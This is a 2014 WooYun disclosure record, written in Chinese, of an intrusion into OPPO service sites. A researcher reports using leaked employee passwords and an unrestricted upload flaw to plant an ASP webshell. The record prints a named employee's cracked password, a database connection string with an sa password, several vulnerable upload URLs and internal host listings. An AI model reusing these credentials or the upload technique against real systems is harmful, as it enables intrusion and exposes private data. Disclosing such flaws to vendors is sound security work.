{"id": 539, "wybug_id": "wooyun-2014-075207", "wybug_title": "oppo手机内网大豪游(涉及大批站点沦陷，大批数据库泄漏，多站点通杀上传漏洞等)", "wybug_corp": "广东欧珀移动通讯有限公司", "wybug_author": "Summer", "wybug_date": "2014-09-05 21:15", "wybug_open_date": "2014-10-20 21:16", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向公众公开  简要描述： 不给乌云的小云闪电标志，绝不罢休！哼！ 详细说明：  首先，我是如何是外网杀入内网。http://fuwu.oppo.com:8899/ oppo客服服务交流中心http://fuwu.oppo.com:8899/sysadmin/index.asp这有个oppo售后服务交流中心的后台，但是我Fuzzing了，无果，尝试了弱口令，无果。通过扫描，发现了一个很普通的搜索页面，但是里面，却不是搜索，而是一份内部员工的帐号密码信息泄漏。http://fuwu.oppo.com:8899/sysadmin/search.asp\n\n通过对密码的解密，去尝试登录上面的后台，发现登录不进去。收集到了内部员工的帐号密码，那么就尽可能的多找些登录页面。http://fuwu.oppo.com:8899/既然没有注册选项，那么我就去尝试登录这个，我们就用“张潇华”这个用户去登录吧。帐号：张潇华 密码：e9108e9d5502834d(解密后：xxhzhang)\n\n\n\n\n\n成功登录进去了···\n\n既然进到了后台，那么就得想办法拿webshell了，这里的拿webshell我就简单说下，因为这个上传的地方，我之前就发现了很多，之前的上传点都没有猜出来目录，所以开始分析这个目录的规律，才明白这个上传点。#############通杀上传漏洞#############通过之前很多上传点猜目录的失败，这次我先来确定目录结构是怎么的。\n\n发现目录结构是这样的：http://fuwu.oppo.com:8899/files/policy/268931035.doc然后开始上传吧，之前是这样的，我在其他站点发现这样的上传点，但是上传成功上传一句话后，找不到路径，构造了很多，是没有成功。\n\n在这里我们可以看到，虽然alert只能上传exe,rar,psd,txt,ppt等等，但是还是成功上传，只需要我们按照那个附件的路径写对就OK了。\nalert('Upload success!');window.opener.document.getElementById('fujian').value='463264491.asp';window.close();\n\n\n\n\n涉及此上传漏洞的地址如下：\nhttp://www.hebeioppo.com/bbs/upfile.asphttp://market.oppo.com:888/bbs/upfile.asphttp://market.oppo.com:888/download/upfile.asphttp://fuwu.oppo.com:8899/bbs/upfile.asp\n还有很多...我就不一一列出了...只要按照我上面的目录，构造对应的目录，就可以拿到，其实不通过后台，我们也可以拿到，因为后台也是同样的上传点，只不过目录没有猜对。   漏洞证明：  \nDomain\tPath:801:\tc:\\inetpub\\wwwroot:8010:\tD:\\移动办公(OMO)172.16.101.211:8010:omo.oppo.com\t172.16.101.211:80:www.winbase.com.cn\tD:\\web site\\winbase172.16.101.211:808:service.oppo.com\tD:\\SHOUHOU:80:www.ibbkehome.com\tD:\\web site\\ibbkehome:8008:pop.myoppo.com\tD:\\web site\\Pop:80:dl.oppo.com\tD:\\web site\\dl.oppo.com:80:www.myoppo.com\tD:\\web site\\tgw:80:myoppo.com\t:80:market1.bbkav.com\tD:\\web site\\bbkav-1:80:service.oppo.com\tD:\\crm172.16.101.211:8088:service.oppo.com\tD:\\OPPOCSSW172.16.101.211:8088:\t172.16.101.211:8090:\tD:\\印尼Service172.16.101.211:8091:\tD:\\VietnService:80:\tD:\\web site\\wanyol:8023:\tD:\\web site\\ioppocn172.16.101.211:8899:fuwu.oppo.com\tD:\\web site\\sales:80:market.bbkav.com\tD:\\web site\\bbkav:80:fuwu.bbkehome.com\tD:\\web site\\bbkehome:8128:\tD:\\BrandUnReceiveMail:8018:sc.myoppo.com\tD:\\web site\\sc:80:www.bbkyw.com.cn\tD:\\web site\\business:80:www.hebeioppo.com\tD:\\web site\\hebeioppo:8088:service.bbkehome.com\tD:\\BBKWCSS:80:market.bbkehome.com\tD:\\web site\\ehome:888:market.oppo.com\tD:\\web site\\oppo market:8091:\tD:\\web site\\testsales172.16.101.211:8011:\tD:\\web site\\xhh:80:plm.oppo.com\tD:\\KPI\\plm:80:jl.myoas.com\tD:\\OPPO Sales\n数据库多到我都数不清，我就不一一列举了。而且很多都是sa的权限的。\nserver=172.16.100.236,1999;UID=sa;PWD=bbkav_9988;database=master;Provider=SQLOLEDB\n\n\n\n\n\nD:\\web site\\sales\\files\\policy\\> ipconfig /allWindows IP Configuration   Host Name . . . . . . . . . . . . : P13   Primary Dns Suffix  . . . . . . . :    Node Type . . . . . . . . . . . . : Unknown   IP Routing Enabled. . . . . . . . : No   WINS Proxy Enabled. . . . . . . . : NoEthernet adapter Local Area Connection:   Connection-specific DNS Suffix  . :    Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection   Physical Address. . . . . . . . . : 00-50-56-A3-3D-24   DHCP Enabled. . . . . . . . . . . : No   IP Address. . . . . . . . . . . . : 172.16.101.211   Subnet Mask . . . . . . . . . . . : 255.255.252.0   Default Gateway . . . . . . . . . : 172.16.103.1   DNS Servers . . . . . . . . . . . : 172.16.101.221\n\nD:\\web site\\sales\\files\\policy\\> net viewServer Name            Remark-------------------------------------------------------------------------------\\\\AUTOTASK                                                                     \\\\AUTOTASK27                                                                   \\\\AUTOTASK28                                                                   \\\\BBKAV-C1                                                                     \\\\BIEE-TEST                                                                    \\\\BIEETEST             BieeTEST                                                \\\\BS01                                                                         \\\\BS02                                                                         \\\\CONSUMPTION-DB                                                               \\\\DG-RONGZAI                                                                   \\\\DS                                                                           \\\\ESA-AP                                                                       \\\\ESA-KF                                                                       \\\\EXAM_WIN2008                                                                 \\\\FTP_EX                                                                       \\\\HR-PS                                                                        \\\\HWSH01                                                                       \\\\ILEARNING01                                                                  \\\\ILEARNING1                                                                   \\\\IMEI                                                                         \\\\IMEI01                                                                       \\\\IOTEST-CA                                                                    \\\\JK-ALLSERVER                                                                 \\\\KAOQIN                                                                       \\\\KAOQIN01                                                                     \\\\KQ-CA                                                                        \\\\KQ02-CA                                                                      \\\\MAIL                                                                         \\\\MAS2000-5                                                                    \\\\MES-A                                                                        \\\\MES-A-SERVER         MES-A                                                   \\\\MOTHERBOARD-CA                                                               \\\\OA-A                 oa-a                                                    \\\\OA-C                                                                         \\\\OA-D                                                                         \\\\OATEST                                                                       \\\\OME-CA                                                                       \\\\OPPO-4376AC34CD                                                              \\\\OPPO-RDM                                                                     \\\\P0485076                                                                     \\\\P1                                                                           \\\\P10901145A                                                                   \\\\P11                                                                          \\\\P13                                                                          \\\\P20                                                                          \\\\P21                                                                          \\\\P4                                                                           \\\\P5                                                                           \\\\P6                                                                           \\\\P80076129                                                                    \\\\PATENTM-SERVER                                                               \\\\PDM1                                                                         \\\\PDM3                                                                         \\\\PEIXUN                                                                       \\\\PLM-A                                                                        \\\\PLM-DEV                                                                      \\\\PLMINSTALLDEMO                                                               \\\\POP                                                                          \\\\PRINT-CA                                                                     \\\\PV1                                                                          \\\\RONGZAI-SH                                                                   \\\\RTX-CA                                                                       \\\\SMARTL                                                                       \\\\TEST-DB                                                                      \\\\TL                                                                           \\\\UBUNTU               ubuntu server (Samba, Ubuntu)                           \\\\UBUNTU-SVN-CA        ubuntu-svn-ca server (Samba, Ubuntu)                    \\\\UBUNTU5              ubuntu5 server (Samba, Ubuntu)                          \\\\V6-OA-1                                                                      \\\\WIN-2SHKLIMARPS                                                              \\\\WIN-RTC-DEV                                                                  \\\\WIN2003_X32                                                                  \\\\WIN2003R2_BA06                                                               \\\\WIN2003R2_X64_T                                                              \\\\WIN2003R2X64ZMD      win2003r2x64zmd                                         \\\\WIN2008_ZMD_NEW                                                              \\\\WIN2008BI                                                                    \\\\WINDOWS-2008R2-                                                              \\\\WMS-TEST-SGH         WMS-TEST-SGH                                            \\\\WXFILE1-SERVER       WXfile1-server server (Samba, Ubuntu)                   \\\\XZ-DG                                                                        \\\\YDSH                                                                         \\\\YN-DBSTANDBY         YN-DBStandby                                            \\\\YNSH_DBSTANDBY       YNSH_DBStandby                                          \\\\淇濆畨棰嗙彮                                                                     \\\\鐢熸椿鍖轰繚瀹夊                                                                 \\\\鐢熸椿鍖烘秷闃插憳\n\nD:\\web site\\sales\\files\\policy\\> net view /domainDomain-------------------------------------------------------------------------------ADC                  ADC3                 BBKAV                EXCHANGE03           WORKGROUP            淇℃伅绠＄悊閮?          璁惧鍚庡嫟閮?\n这个有多大...就不用我说了吧...   修复方案：  1.清理webshell2.修复上传漏洞3.避免敏感信息泄漏   版权声明：转载请注明来源 Summer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-06 15:54 厂商回复： 内部服务系统，IT已在全力修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-05 22:46 |    \t\t胖子 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:16        | 加大你的带宽!加大你的内存!加大你的显示器...)\t\t \n  你这么屌家里人知道吗？    \n     2014-09-06 09:09 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  So diao    \n     2014-09-06 11:25 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  坤坤最近经常日站啊    \n     2014-09-06 17:21 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  我草，我的oppo啊    \n     2014-09-26 22:23 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  为何不内网渗透？？    \n     2014-09-26 22:30 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  怎么不渗透内网，说好的漫游呢~    \n     2014-10-21 08:29 |    \t\tieasyi \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  怎么不渗透内网，说好的漫游呢~ 难道漫游费太高？and 中国移动？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}